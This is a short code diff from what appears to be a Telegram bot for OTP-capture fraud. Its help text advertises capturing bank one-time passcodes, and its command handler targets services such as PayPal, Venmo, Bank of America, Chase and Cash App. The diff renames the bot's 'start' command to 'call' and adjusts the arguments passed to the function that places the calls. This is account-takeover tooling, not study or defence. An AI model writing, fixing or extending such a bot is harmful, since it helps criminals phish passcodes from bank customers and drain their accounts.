@@ -71,7 +71,7 @@ bot.help(ctx => ctx.reply(`
 ➤ /paypal - Capture bank OTP\n
 `))
 
-bot.command('start', ctx => {
+bot.command('call', ctx => {
    console.log(ctx)
    const number = ctx.message.text.split(' ');
    const service = [ 'paypal', 'venmo', 'boa', 'chase', 'bank', 'cashapp' ]
@@ -93,7 +93,7 @@ bot.command('start', ctx => {
          }
       }).then(() =>{
          console.log('yay')
-         call(number[2], number[3], ctx)
+         call(number[3], ctx)
       })      
    }
 
